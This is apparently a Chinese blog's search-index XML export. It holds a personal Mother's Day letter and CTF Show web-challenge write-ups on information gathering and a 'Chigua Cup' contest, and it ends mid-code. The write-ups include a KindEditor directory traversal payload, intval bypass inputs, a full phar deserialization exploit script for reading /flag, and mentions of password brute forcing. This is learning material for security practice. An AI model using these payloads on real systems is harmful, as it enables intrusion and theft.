<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021年的母亲节</title>
    <url>/2021/05/09/2021%E5%B9%B4%E7%9A%84%E6%AF%8D%E4%BA%B2%E8%8A%82/</url>
    <content><![CDATA[<p>​    从前我总是不曾在意一些节日，就连身边人的生日也从不上心，也许是离家久了，也许了自己长大了许多，也许是自己在害怕些什么，也许是自己突然意识到某些东西它并不是一成不变的，到了今年今日，我再也无法对这些节日避讳，我意识到，今天过后，我需要做出一些改变。</p>
<p>​    以下是我想对她说的话：</p>
<blockquote>
<p>母亲节到了，你要当一个乖一点的妈妈，<br>多陪我聊聊天；<br>多学着做一些好吃的饭；<br>多多把我的房间打扫的干干净净；<br>多多听一些我推荐给你的歌；<br>多多听我劳力唠叨，抱怨这抱怨那；<br>多多听我讲我好想讲的话，关于歌手的，关于明星的，关于电视剧的，关于电影的，关于杰哥的，关于学校的，关于朋友的，关于我遇到的好多好多事；<br>多多给我一些预料不到的好吃的；<br>多多身体好一些；<br>多多快乐一些；<br>多多在全民K歌上唱歌；<br>多多和朋友出去散心；<br>多多表达出自己的感情；<br>多多对自己好一点；<br>少吃点泡面，多吃些肉；<br>多多吃你最爱的苹果；<br>多多喝热水；<br>早点睡，晚点起；<br>少想那些乱七八糟的；<br>不用担心我，不用考虑未来（反正一定是跟我在一起的）；<br>就这样吧，也说的挺多了，反正就是，你要记得，做一个乖一点的妈妈哦！</p>
</blockquote>
<p>2021.5.9</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>CTF Show---信息搜集</title>
    <url>/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p>CTF Show 中 web入门，信息搜集篇。</p>
<span id="more"></span>

<h1 id="一、CTF-Show-—-信息搜集"><a href="#一、CTF-Show-—-信息搜集" class="headerlink" title="一、CTF Show — 信息搜集"></a>一、CTF Show — 信息搜集</h1><h2 id="1-1-Web1-—-查看源代码"><a href="#1-1-Web1-—-查看源代码" class="headerlink" title="1.1 Web1 — 查看源代码"></a>1.1 Web1 — 查看源代码</h2><p>直接查看源代码</p>
<p><img src="https://i.loli.net/2021/07/14/QcVRY3rX9a4USMZ.png" alt="image-20210714105835548"></p>
<h2 id="1-2-Web-2-—-查看源代码"><a href="#1-2-Web-2-—-查看源代码" class="headerlink" title="1.2 Web 2 — 查看源代码"></a>1.2 Web 2 — 查看源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure>

<p><strong>查看源代码的几种方式</strong></p>
<ul>
<li>右键查看源代码</li>
<li>F12 打开开发者工具</li>
<li>Ctrl + U 查看源代码</li>
<li>Burp 抓包查看</li>
</ul>
<h2 id="1-3-Web-3-—-抓包"><a href="#1-3-Web-3-—-抓包" class="headerlink" title="1.3 Web 3 — 抓包"></a>1.3 Web 3 — 抓包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure>

<p>抓包 尝试</p>
<p><img src="https://i.loli.net/2021/07/14/kOtL1lBa8b53pIS.png" alt="image-20210714111126154"></p>
<h2 id="1-4-Web-4-—-robots-txt-泄露"><a href="#1-4-Web-4-—-robots-txt-泄露" class="headerlink" title="1.4 Web 4 — robots.txt 泄露"></a>1.4 Web 4 — robots.txt 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/1t2zsvMoAJTPO3V.png" alt="image-20210714111325675"></p>
<p><img src="https://i.loli.net/2021/07/14/npvowT7mgbIzx2C.png" alt="image-20210714111358421"></p>
<h2 id="1-5-Web-5-—-phps-文件"><a href="#1-5-Web-5-—-phps-文件" class="headerlink" title="1.5 Web 5 — phps 文件"></a>1.5 Web 5 — phps 文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure>

<blockquote>
<p> <strong>phps文件</strong></p>
<p> ​    就是php的 <strong>源代码文件</strong>，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p>
<p> ​    它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/07/14/m2Mex6SziNTg7EW.png" alt="image-20210714111652581"></p>
<p><img src="https://i.loli.net/2021/07/14/wRkJOuGiavhnM7N.png" alt="image-20210714111806962"></p>
<h2 id="1-6-Web-6-—-www-zip-泄露"><a href="#1-6-Web-6-—-www-zip-泄露" class="headerlink" title="1.6 Web 6 — www.zip 泄露"></a>1.6 Web 6 — <a href="http://www.zip/">www.zip</a> 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解压源码到当前目录，测试正常，收工</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/9NrWGukdyw5EVMX.png" alt="image-20210714111959516"></p>
<p><img src="https://i.loli.net/2021/07/14/uZqlnDYc3SFaAMC.png" alt="image-20210714113312486"></p>
<p><img src="https://i.loli.net/2021/07/14/xWMmasCKAd91Pfq.png" alt="image-20210714113251749"></p>
<h2 id="1-7-Web-7-—-版本控制-git"><a href="#1-7-Web-7-—-版本控制-git" class="headerlink" title="1.7 Web 7 — 版本控制 .git"></a>1.7 Web 7 — 版本控制 <code>.git</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/mWX7dRU4ntLrFZs.png" alt="image-20210714150846912"></p>
<h2 id="1-8-Web-8-—-版本控制-svn"><a href="#1-8-Web-8-—-版本控制-svn" class="headerlink" title="1.8 Web 8 — 版本控制 .svn"></a>1.8 Web 8 — 版本控制 <code>.svn</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/DZMXJGrz7fAC9ju.png" alt="image-20210714152837039"></p>
<h2 id="1-9-Web-9-—-vim-临时文件缓存"><a href="#1-9-Web-9-—-vim-临时文件缓存" class="headerlink" title="1.9 Web 9 — vim 临时文件缓存"></a>1.9 Web 9 — vim 临时文件缓存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure>

<p><strong>Vim 缓存</strong></p>
<blockquote>
<p>​    <strong>临时文件</strong> 是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动</p>
<p>删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可</p>
<p>以通过缓存文件恢复原始文件内容</p>
<p>​    <strong>以 index.php 为例</strong> </p>
<ol>
<li><p>第一次产生的缓存文件名为 <code>.index.php.swp</code></p>
</li>
<li><p>第二次意外退出后，文件名为 <code>.index.php.swo</code></p>
</li>
<li><p>第三次产生的缓存文件则为 <code>.index.php.swn</code></p>
</li>
</ol>
</blockquote>
<p><img src="https://i.loli.net/2021/07/14/AJUYaWD9ImPz7bF.png" alt="image-20210714153426274"></p>
<h2 id="1-10-Web-10-—-cookie-泄露"><a href="#1-10-Web-10-—-cookie-泄露" class="headerlink" title="1.10 Web 10 — cookie 泄露"></a>1.10 Web 10 — cookie 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/3R6u9WMdatXgSOv.png" alt="image-20210714154500245"></p>
<h2 id="1-11-Web-11-—-域名解析查询"><a href="#1-11-Web-11-—-域名解析查询" class="headerlink" title="1.11 Web 11 — 域名解析查询"></a>1.11 Web 11 — 域名解析查询</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br></pre></td></tr></table></figure>

<p><strong>查看域名解析</strong></p>
<ul>
<li><p><code>nslookup</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -qt=txt ctfshow.com</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#nslookup 查询#直接域名查询nslookup domain#查询记录nslookup -qt = type domain [dns-server]type:    A 				--&gt;地址记录    AAAA   			--&gt;地址记录    AFSDB Andrew    --&gt;文件系统数据库服务器记录    ATMA 			--&gt;ATM地址记录    CNAME  			--&gt;别名记录    HINHO 		 	--&gt;硬件配置记录，包括CPU、操作系统信息     ISDN   			--&gt;域名对应的ISDN号码    MB  	 		--&gt;存放指定邮箱的服务器    MG    			--&gt;邮件组记录    MINFO   		--&gt;邮件组和邮箱的信息记录    MR   			--&gt;改名的邮箱记录    MX   			--&gt;邮件服务器记录    NS 				--&gt; 名字服务器记录    PTR    			--&gt;反向记录    RP   			--&gt;负责人记录    RT  			--&gt;路由穿透记录    SRV    			--&gt;TCP服务器信息记录    TXT   			--&gt;域名对应的文本信息    X25  			--&gt;域名对应的X.25地址记录</span></span><br></pre></td></tr></table></figure></li>
<li><p>在线历史解析记录查询</p>
<p><img src="https://i.loli.net/2021/07/14/knpAHlIUJx7zyYK.png" alt="image-20210714155814946"></p>
</li>
<li><p>阿里云 DNS 检测</p>
<p><a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p>
<p><img src="https://i.loli.net/2021/07/14/yef6FBRPSJTgoKw.png" alt="image-20210714170535242"></p>
</li>
</ul>
<h2 id="1-12-Web-12-—-网站公开信息"><a href="#1-12-Web-12-—-网站公开信息" class="headerlink" title="1.12 Web 12 — 网站公开信息"></a>1.12 Web 12 — 网站公开信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/hjlGXmsgyWSYrwf.png" alt="image-20210714171715223"></p>
<p><img src="https://i.loli.net/2021/07/14/eqwKlZuvLd2PJX8.png" alt="image-20210714171804528"></p>
<h2 id="1-13-Web-13-—-网站技术文档"><a href="#1-13-Web-13-—-网站技术文档" class="headerlink" title="1.13 Web 13 — 网站技术文档"></a>1.13 Web 13 — 网站技术文档</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/R2degLa3pzZKuni.png" alt="image-20210714172026755"></p>
<p><img src="https://i.loli.net/2021/07/14/lcYNRWCgMmvZaPw.png" alt="image-20210714172038292"></p>
<p><img src="https://i.loli.net/2021/07/14/lcpfsX1RWYOA3zP.png" alt="image-20210714172215536"></p>
<h2 id="1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）"><a href="#1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）" class="headerlink" title="1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）"></a>1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人2. 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</span><br></pre></td></tr></table></figure>

<p><strong>KindEditor 3.5.5 遍历目录漏洞</strong>        <a href="http://www.nxadmin.com/web/96.html">http://www.nxadmin.com/web/96.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload/url/editor/php/file_manager_json.php?path=/	#可爆出根目录下所有文件/url/editor/php/file_manager_json.php?path=/var/www/html/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/27sLANSvX83kgRw.png" alt="image-20210715100641820"></p>
<p><img src="https://i.loli.net/2021/07/15/y9mVSprWKqZFPGT.png" alt="image-20210715100746950"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/rF2dO9o3JD8cVCx.png" alt="image-20210715100941439"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/url/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/xPqTEnG4DrLtIwy.png" alt="image-20210715101127445"></p>
<p>拓展：<a href="https://blog.csdn.net/u011781521/article/details/59057759/">编辑器漏洞</a></p>
<h2 id="1-15-Web-15-—-前端邮箱信息泄露"><a href="#1-15-Web-15-—-前端邮箱信息泄露" class="headerlink" title="1.15 Web 15 — 前端邮箱信息泄露"></a>1.15 Web 15 — 前端邮箱信息泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure>

<p>前端页面当中找到邮箱信息</p>
<p><img src="https://i.loli.net/2021/07/14/NqisDzZkouH2Oyb.png" alt="image-20210714173643444"></p>
<p><img src="https://i.loli.net/2021/07/14/Gzt8XqyCpu5drMk.png" alt="image-20210714173940662"></p>
<p>忘记密码 密保答案 西安 </p>
<p>成功重置密码</p>
<p>成功登录 拿到 flag</p>
<h2 id="1-16-Web-16-—-探针信息"><a href="#1-16-Web-16-—-探针信息" class="headerlink" title="1.16 Web 16 — 探针信息"></a>1.16 Web 16 — 探针信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure>

<p><strong>PHP 探针</strong></p>
<blockquote>
<p>​    <strong>php探针</strong> 是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A1%AC%E7%9B%98/486482">服务器硬盘</a>资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p>
</blockquote>
<p><a href="https://www.laozuo.org/16305.html">常用4款PHP探针</a></p>
<p>应该是雅黑探针，访问 <code>/tz.php</code></p>
<p><img src="https://i.loli.net/2021/07/14/Yb2xc5XQIrMFopy.png" alt="image-20210714213514783"></p>
<p>查找 <code>ctfshow</code> 即可</p>
<h2 id="1-17-Web-17-—-绕过-CDN-查-IP"><a href="#1-17-Web-17-—-绕过-CDN-查-IP" class="headerlink" title="1.17 Web 17 — 绕过 CDN 查 IP"></a>1.17 Web 17 — 绕过 CDN 查 IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; </span><br></pre></td></tr></table></figure>

<p>全球 ping 可知：无 CDN </p>
<p>查 <code>www.ctfshow.com</code> 的 IP，即为 ctfer.com的真实IP</p>
<h2 id="1-18-Web-18-—-前端-js-泄露"><a href="#1-18-Web-18-—-前端-js-泄露" class="headerlink" title="1.18 Web 18 — 前端 js 泄露"></a>1.18 Web 18 — 前端 js 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不要着急，休息，休息一会儿，玩101分给你flag</span><br></pre></td></tr></table></figure>

<p>查看源码，发现 <code>Flappy_js.j</code></p>
<p><img src="https://i.loli.net/2021/07/14/JzW2SpRsToZ91FA.png" alt="image-20210714180947784"></p>
<p>unicode 解码</p>
<p><img src="https://i.loli.net/2021/07/14/8H1RKnwdOsVSoY6.png" alt="image-20210714181055283"></p>
<p>访问 <code>110.php</code></p>
<p><img src="https://i.loli.net/2021/10/01/GP8DOvbLRjIf4yC.png" alt="image-20210714181154250"></p>
<h2 id="1-19-Web-19-—-前端密钥泄露"><a href="#1-19-Web-19-—-前端密钥泄露" class="headerlink" title="1.19 Web 19 — 前端密钥泄露"></a>1.19 Web 19 — 前端密钥泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>

<p>查看源码得到</p>
<p><img src="https://i.loli.net/2021/10/01/Wah8ZeLOXHFm1lw.png" alt="image-20210714181430721"></p>
<p>会有函数对我们提交的内容进行加密处理，处理后结果如果是下面绿色部分就显示flag，我们完全可以抓包直接将其修改为正确的样子</p>
<p><img src="https://i.loli.net/2021/07/14/xOsDeocflHvaiu6.png" alt="image-20210714181906722"></p>
<h2 id="1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露"><a href="#1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露" class="headerlink" title="1.20 Web 20 — 早期 asp+access /db/db.mdb 文件泄露"></a>1.20 Web 20 — 早期 asp+access <code>/db/db.mdb</code> 文件泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/iFHty9PwMOAcWQb.png" alt="image-20210714182153060"></p>
<h2 id="1-21-Web-382-—"><a href="#1-21-Web-382-—" class="headerlink" title="1.21 Web 382 —"></a>1.21 Web 382 —</h2><p>首先查看源代码</p>
<p><img src="https://i.loli.net/2021/08/03/J71pYxy4QUmt2eM.png" alt="image-20210803095937572"></p>
<p>可以一一进行尝试，最后发现 <code>http://url/alsckdfy/</code> 竟然是网站的后台登录页面    </p>
<ul>
<li>爆破 弱密码</li>
<li>sql 万能密码</li>
</ul>
<p>成功登录之后即可获得 flag</p>
<h1 id="二、做题总结"><a href="#二、做题总结" class="headerlink" title="二、做题总结"></a>二、做题总结</h1><ul>
<li><p>第一步：查看 <strong>源代码</strong></p>
<ul>
<li>右键查看源代码</li>
<li>F12 打开开发者工具</li>
<li>Ctrl + U 查看源代码</li>
<li>Burp 抓包查看</li>
</ul>
</li>
<li><p><strong>抓包</strong> 可能发现一些有用信息</p>
</li>
<li><p><strong>robots.txt</strong> </p>
</li>
<li><p><strong>phps</strong> 源代码泄露</p>
</li>
<li><p>下载源码文件、网站备份文件</p>
</li>
<li><p>版本控制不要部署到生产环境中 <code>.git  .svn</code></p>
</li>
<li><p><strong>Vim 缓存</strong>    <code>.文件名.php.swp  .文件名.php.swo  .文件名.php.swn</code></p>
</li>
<li><p>cookie 的重要性</p>
</li>
<li><p>域名、子域名 信息搜集    <code>nslookup   在线网站</code></p>
</li>
<li><p>Banner 等公开信息   <code>管理员密码  QQ  QQ邮箱等  第三方软件查个人信息</code></p>
</li>
<li><p>技术文档</p>
</li>
<li><p>对应编辑器漏洞</p>
</li>
<li><p>探针</p>
</li>
<li><p>前端源码 密钥泄露</p>
</li>
<li><p><strong>db.mdb</strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF-Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-吃瓜杯</title>
    <url>/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/</url>
    <content><![CDATA[<p>CTF Show 吃瓜杯篇。</p>
<span id="more"></span>

<h1 id="CTF-Show-吃瓜杯"><a href="#CTF-Show-吃瓜杯" class="headerlink" title="CTF Show 吃瓜杯"></a>CTF Show 吃瓜杯</h1><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==4476)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,0)===4476)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">?num=%0c010574</span><br><span class="line">?num=%0a010574</span><br></pre></td></tr></table></figure>

<h2 id="ATTup"><a href="#ATTup" class="headerlink" title="ATTup"></a>ATTup</h2><p>zip 文件上传 + 文件包含 file_get_contents —&gt; <a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar 反序列化</a></p>
<p>文件内容过滤  &lt;?   php ，过滤 <code>&lt;?</code> ，无法正常解析为 php 代码</p>
<p>上传成功发现：序列化与反序列化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span> = <span class="string">&quot;:)&quot;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$stat</span> = @<span class="built_in">stat</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure>

<p><strong>生成 .phar 文件：</strong></p>
<p>我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class View&#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span>=<span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun= new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun=new View(); <span class="comment"># 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</span></span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun-&gt;fn=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;?</code> 过滤，使用 实体html 编码代替 ，<code>&amp;lt;    &amp;gt;</code>   </li>
</ul>
<p>访问，生成 123.phar</p>
<p>更改后缀得到 123.zip</p>
<p>上传</p>
<p>查询 123.zip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=phar://123.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png" alt="image-20210816154246098"></p>
<p><img src="https://i.loli.net/2021/10/01/p8VCePGW9IHAQd6.png" alt="image-20210816113908803"></p>
<h2 id="魔女"><a href="#魔女" class="headerlink" title="魔女"></a>魔女</h2><p><img src="https://i.loli.net/2021/08/14/IekhA6SdQWPnt7N.png" alt="image-20210814201633444"></p>
<p>注册</p>
<p><img src="https://i.loli.net/2021/08/14/KmC57VgziIMBRa4.png" alt="image-20210814201610476"></p>
<p>注册成功，登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">layui.use([<span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;table&#x27;</span>,<span class="string">&#x27;element&#x27;</span>], <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">	  var layer = layui.layer</span><br><span class="line">	  ,form = layui.form</span><br><span class="line">	  ,table = layui.table</span><br><span class="line">	  ,element = layui.element</span><br><span class="line"></span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">home</span></span>()&#123;</span><br><span class="line">    $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;main&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">logout</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;logout&#x27;</span>);</span><br><span class="line">		$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">		location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">saveAvatar</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;download&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span 